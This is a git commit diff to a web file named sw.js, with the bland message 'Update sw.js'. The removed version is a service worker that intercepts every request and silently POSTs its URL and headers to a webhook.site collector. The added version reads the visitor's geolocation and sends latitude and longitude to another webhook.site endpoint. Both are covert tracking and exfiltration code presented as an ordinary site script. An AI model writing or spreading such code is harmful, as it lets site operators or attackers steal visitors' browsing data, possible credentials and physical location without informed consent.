e7518f05149d5b2e5857a64d0a47605fb11db3a9
Tjmz <87590654+Tjmz@users.noreply.github.com>
2025-12-08 09:30:01 +0000

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,29 +1,21 @@
-self.addEventListener('fetch', function(event) {
+// Check if the browser supports the Geolocation API
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+}
 
-  event.respondWith(
-
-    fetch(event.request).then(function(response) {
-
-      // Log all 
-
-      fetch('https://webhook.site/c4c28201-0298-4c51-8d8a-b4b59034116e', {
-
+// Function to run if the user grants permission
+function successCallback(position) {
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
+    var data = { latitude: lat, longitude: lon };
+    fetch('https://webhook.site/21bb88af-9640-4faa-b5f9-fb118d6c85c4', {
         method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    });
+}
 
-        body: JSON.stringify({
-
-          url: event.request.url,
-
-          headers: [...event.request.headers]
-
-        })
-
-      });
-
-      return response;
-
-    })
-
-  );
-
-});
+// Function to run if the user denies permission or an error occurs
+function errorCallback(error) {
+    console.log("Geolocation error:", error.message);
+}
